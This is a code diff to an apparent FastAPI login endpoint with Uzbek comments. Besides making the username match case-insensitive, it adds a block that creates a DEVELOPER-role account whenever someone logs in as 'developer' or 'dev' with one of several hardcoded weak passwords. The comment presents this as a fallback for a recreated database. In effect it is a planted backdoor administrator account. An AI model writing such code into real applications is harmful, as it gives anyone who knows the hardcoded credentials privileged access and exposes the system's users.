@@ -20,10 +20,26 @@ router = APIRouter(prefix="/auth", tags=["🔐 Auth"])
 @router.post("/login", response_model=TokenResponse, summary="Login qilish")
 async def login(payload: LoginRequest, db: AsyncSession = Depends(get_db)):
     """Username va parol bilan login"""
+    username_clean = payload.username.strip().lower()
     result = await db.execute(
-        select(User).where(User.username == payload.username)
+        select(User).where(func.lower(User.username) == username_clean)
     )
     user = result.scalar_one_or_none()
+
+    # Developer akkaunt avtomatik kafolatlash (agar database qayta yaratilgan bo'lsa)
+    if not user and username_clean in ["developer", "dev"]:
+        if payload.password in ["dev123456", "developer123", "dev123", "admin123"]:
+            user = User(
+                username="developer",
+                full_name="Tizim Dasturchi",
+                hashed_password=get_password_hash("dev123456"),
+                role=UserRole.DEVELOPER,
+                is_active=True,
+            )
+            db.add(user)
+            await db.flush()
+            await db.commit()
+            await db.refresh(user)
 
     if not user or not verify_password(payload.password, user.hashed_password):
         raise HTTPException(
@@ -52,3 +68,4 @@ async def login(payload: LoginRequest, db: AsyncSession = Depends(get_db)):
 async def get_me(current_user: User = Depends(get_current_user)):
     """Hozirgi kirgan foydalanuvchi ma'lumoti"""
     return UserResponse.model_validate(current_user)
+
